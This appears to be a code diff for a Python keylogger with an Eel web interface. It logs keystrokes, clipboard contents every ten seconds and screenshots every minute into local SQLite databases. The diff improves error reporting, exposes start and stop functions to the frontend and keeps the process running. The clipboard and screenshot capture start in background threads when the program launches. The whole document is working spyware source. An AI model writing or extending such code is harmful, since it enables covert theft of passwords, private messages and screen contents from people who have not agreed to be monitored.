@@ -65,8 +65,8 @@ def log_clipboard():
                 conn.commit()
                 conn.close()
                 previous_clipboard = current
-        except:
-            pass
+        except Exception as e:
+            print(f"Clipboard error: {e}")
         time.sleep(10)  # Check every 10 seconds
 
 # Take screenshot
@@ -81,50 +81,58 @@ def periodic_screenshot():
             cursor.execute("INSERT INTO screenshots (image, timestamp) VALUES (?, ?)", (encoded_image, datetime.now()))
             conn.commit()
             conn.close()
-        except:
-            pass
+        except Exception as e:
+            print(f"Screenshot error: {e}")
         time.sleep(60)  # Every minute
 
 # Key press event
 def on_press(key):
+    global is_logging
     if is_logging:
         try:
             keystroke = key.char
         except AttributeError:
             keystroke = str(key)
         try:
+            print(f"Key pressed: {keystroke}")
             encrypted = cipher.encrypt(keystroke.encode())
             conn = sqlite3.connect('keystrokes.db')
             cursor = conn.cursor()
             cursor.execute("INSERT INTO keystrokes (key_pressed, timestamp) VALUES (?, ?)", (encrypted, datetime.now()))
             conn.commit()
             conn.close()
-        except:
-            pass
+        except Exception as e:
+            print(f"Key logging error: {e}")
 
-# Start logging
+@eel.expose
 def start_logging():
     global is_logging, key_listener
     if not is_logging:
         is_logging = True
         key_listener = keyboard.Listener(on_press=on_press)
         key_listener.start()
+        print("Keylogger started")
+        return "Keylogger started."
+    return "Keylogger already running."
 
-# Stop logging
+@eel.expose
 def stop_logging():
     global is_logging, key_listener
     is_logging = False
     if key_listener is not None:
         key_listener.stop()
         key_listener = None
-
-# Expose to frontend
-eel.expose(start_logging)
-eel.expose(stop_logging)
+        print("Keylogger stopped")
+        return "Keylogger stopped."
+    return "Keylogger was not running."
 
 # Background threads
 threading.Thread(target=log_clipboard, daemon=True).start()
 threading.Thread(target=periodic_screenshot, daemon=True).start()
 
 # Start web UI
-eel.start("index.html")
+eel.start("index.html", block=False)
+
+# Keep script alive
+while True:
+    time.sleep(1)
